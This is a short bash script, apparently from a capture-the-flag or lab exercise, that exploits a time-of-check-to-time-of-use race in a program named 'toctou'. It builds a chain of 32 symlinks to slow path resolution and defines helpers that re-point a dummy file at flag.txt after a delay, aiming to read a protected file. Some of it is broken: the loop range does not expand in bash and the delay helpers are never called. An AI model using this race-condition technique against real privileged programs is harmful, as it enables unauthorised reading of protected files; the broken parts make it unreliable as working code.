#! /usr/bin/bash

rng_delayed_link () {
    sleep .$[ ( $RANDOM % 500 ) + 1 ]s
    ln -sf flag.txt dummmy_file.txt
}

delayed_link () {
    for i in {1..$1}
    do
        sleep 0.001
    done
    ln -sf flag.txt dummmy_file.txt
}

NUM_SYMLINKS=32

rm -fr tmp
mkdir tmp
cd tmp
touch dummmy_file.txt
ln $PWD/dummmy_file.txt $PWD/ln0.txt

for i in $(seq 1 $NUM_SYMLINKS); 
do
    ln -s $PWD/ln$[$i - 1].txt $PWD/ln$i.txt
done
echo $SECONDS
time (../toctou ln$NUM_SYMLINKS.txt)
